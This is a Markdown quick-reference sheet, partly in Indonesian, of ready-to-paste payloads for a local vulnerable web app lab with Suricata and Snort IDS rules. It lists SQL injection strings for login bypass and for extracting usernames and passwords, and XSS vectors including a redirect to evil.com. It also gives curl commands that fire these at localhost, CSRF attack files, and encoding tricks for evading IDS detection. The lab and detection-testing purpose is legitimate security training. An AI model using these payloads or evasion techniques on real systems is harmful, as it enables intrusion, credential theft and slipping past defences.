# 🎯 Quick Payload Reference

Payload siap pakai untuk copy-paste langsung.

---

## 🔴 SQLi Payloads

### Login Bypass
```
Username: admin' OR '1'='1
Password: anything
```

### Pencarian Surat - Show All
```
1' OR '1'='1' #
```

### Extract Users & Passwords
```
1' UNION SELECT username,password,3,created_at FROM users #
```

### Get Database Version
```
1' UNION SELECT 1,VERSION(),3,4 #
```

### Time Delay (5 seconds)
```
1' AND SLEEP(5) #
```

### Alternative: Using -- comment
```
1' OR '1'='1' -- -
1' UNION SELECT username,password,3,created_at FROM users -- -
```

---

## 💉 XSS Payloads

### Basic Alert
```html
<script>alert('XSS')</script>
```

### IMG onerror
```html
<img src=x onerror="alert('XSS')">
```

### SVG onload
```html
<svg onload="alert('XSS')">
```

### Cookie Stealer
```html
<img src=x onerror="alert(document.cookie)">
```

### Redirect
```html
<script>document.location='http://evil.com'</script>
```

---

## 🎯 CSRF Files

### Direct Attack (csrf_attack.html)
```
file:///D:/laragon/www/dvwalast/csrf_attack.html
```

### Silent Attack (csrf_iframe_attack.html)
```
file:///D:/laragon/www/dvwalast/csrf_iframe_attack.html
```

---

## 🧪 Quick Test URLs

### SQLi Login
```
http://localhost:8000/login.php
```

### SQLi Search
```
http://localhost:8000/sqli.php?search=1' OR '1'='1' -- 
```

### XSS Reflected
```
http://localhost:8000/xss_reflected.php?name=<script>alert('XSS')</script>
```

### XSS Stored
```
http://localhost:8000/xss_stored.php
```

### CSRF
```
http://localhost:8000/csrf.php
```

---

## 📊 IDS Rules Quick Reference

| Payload Type | Suricata SID | Snort SID |
|--------------|--------------|-----------|
| Single Quote | 100003, 100004 | 300002, 300005 |
| UNION SELECT | 100001, 100002 | 300001, 300004 |
| 1=1 Logic | 100005, 100006 | 300003, 300006 |
| SQL Comment | 100007 | - |
| Script Tag | 100010, 100011 | 300010, 300012 |
| onerror | 100012, 100013 | 300011, 300013 |
| alert() | 100014, 100015 | - |
| CSRF | 100021 | 300021 |

---

## 🚀 Testing Commands

### PowerShell (Windows)
```powershell
.\test_payloads.ps1
```

### Bash (Linux/Kali)
```bash
chmod +x test_payloads.sh
./test_payloads.sh
```

### Manual curl (Linux)
```bash
# Login bypass
curl -X POST http://localhost:8000/login.php \
  -d "username=admin' OR '1'='1" \
  -d "password=anything" \
  -c cookies.txt

# SQLi UNION
curl -b cookies.txt "http://localhost:8000/sqli.php?search=1' UNION SELECT username,password,3,created_at FROM users --"

# XSS Stored
curl -b cookies.txt -X POST http://localhost:8000/xss_stored.php \
  -d "comment=<script>alert('XSS')</script>"
```

---

## 🔥 Common Evasion Techniques

### Case Mixing
```
UnIoN SeLeCt
<ScRiPt>
```

### Comment Injection
```
UN/**/ION SE/**/LECT
<script/**/src=x>
```

### URL Encoding
```
%27%20OR%20%271%27%3D%271
%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

### Double URL Encoding
```
%2527%2520OR%2520%25271%2527%253D%25271
```

### Hex Encoding
```
0x554E494F4E (UNION)
0x53454C454354 (SELECT)
```

---

**Saved:** `QUICK_PAYLOADS.md`
